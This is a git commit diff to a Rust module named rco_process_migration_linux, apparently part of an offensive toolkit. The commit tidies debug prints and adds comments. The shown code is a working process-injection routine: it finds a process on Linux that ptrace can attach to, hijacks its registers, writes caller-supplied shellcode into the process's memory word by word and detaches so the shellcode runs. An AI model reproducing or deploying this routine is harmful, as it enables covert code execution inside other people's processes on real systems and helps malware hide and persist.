0a01923db90caa8c729cf7def482344c362c6bc5
koins <koins@duck.com>
2022-01-04 05:29:26 -0800

    removed a few prints and added some coments

--- process_migration/src/rco_process_migration_linux/mod.rs
+++ process_migration/src/rco_process_migration_linux/mod.rs
@@ -4,10 +4,9 @@ use nix::sys::wait::waitpid;
 use nix::unistd::Pid;
 use std::process::{self, Command};
 use std::ffi::c_void;
-use std::{cmp, mem};
 
 pub fn inject_and_migrate(shellcode: &[u8]) {
-    println!("Shellcode len: {}", shellcode.len());
+    // Find the WORD size (in bytes) for the operating system and convert it to a usize
     let word_size_in_bytes = Command::new("getconf")
                                     .arg("WORD_BIT")
                                     .output()
@@ -16,7 +15,13 @@ pub fn inject_and_migrate(shellcode: &[u8]) {
                                     .unwrap();
     word_size_in_bytes.pop();
     let word_size_in_bytes = word_size_in_bytes.parse::<usize>().unwrap() >> 3;
-    println!("{:?}", word_size_in_bytes);
+
+    // Mutate the shellcode to pad it with zeros to a length divisible by WORD size
+    let mut shellcode = shellcode.to_vec();
+    let needed_size = shellcode.len() + (word_size_in_bytes - shellcode.len() % word_size_in_bytes);
+    shellcode.resize(needed_size, 0);
+
+    // Find a PID that ptrace can attach to
     let mut target_pid = 0;
     let list_pids = Command::new("ls")
             .arg("/proc/")
@@ -37,7 +42,8 @@ pub fn inject_and_migrate(shellcode: &[u8]) {
     if target_pid == 0 {
         panic!("Could not find a process whose memory can be manipulated");
     }
-    println!("Target PID: {:?}", target_pid);
+
+    // Wait for the process to be ready for manipulation, then dump registers
     let target_pid = Pid::from_raw(target_pid);
     if let Err(error) = waitpid(target_pid, None) {
         panic!("Could not wait for target process to change state: {}", error);
@@ -46,25 +52,20 @@ pub fn inject_and_migrate(shellcode: &[u8]) {
         Err(error) => panic!("Could not get registers for target process: {}", error),
         Ok(value) => value
     };
-    println!("{:?}", registers);
+
+    // Modify registers similar to how http://phrack.org/issues/59/12.html did
     registers.rsp -= 4;
-    println!("{:?}", registers);
     if let Err(error) = unsafe { write(target_pid, registers.rsp as *mut c_void, registers.rip as *mut c_void) }{
         panic!("Unable to write RIP to RSP in target process: {}", error);
     }
     let mut point = registers.rsp - 1024;
     registers.rip = registers.rsp - 1022;
-    let mut point = registers.rip;
     if let Err(error) = setregs(target_pid, registers) {
         panic!("Unable to reset target process registers: {}", error);
     }
-    let mut shellcode = shellcode.to_vec();
-    for _ in 0..(word_size_in_bytes - shellcode.len() % word_size_in_bytes) {
-        shellcode.push(0);
-    }
-    println!("{:?}", shellcode);
+
+    // Write shellcode to target process one WORD at a time
     let shellcode_chunks: Vec<&[u8]> = shellcode.chunks(word_size_in_bytes).collect();
-    println!("{:?}", shellcode_chunks);
     for chunk in shellcode_chunks {
         println!("{:p}", chunk);
         if let Err(error) = unsafe { write(target_pid, point as *mut c_void, chunk.as_ptr() as *mut c_void) } {
@@ -72,6 +73,8 @@ pub fn inject_and_migrate(shellcode: &[u8]) {
         }
         point += word_size_in_bytes as u64;
     }
+
+    // Detach from the process so it can resume execution
     if let Err(error) = detach(target_pid, None) {
         panic!("Unable to detach from target process: {}", error);
     }
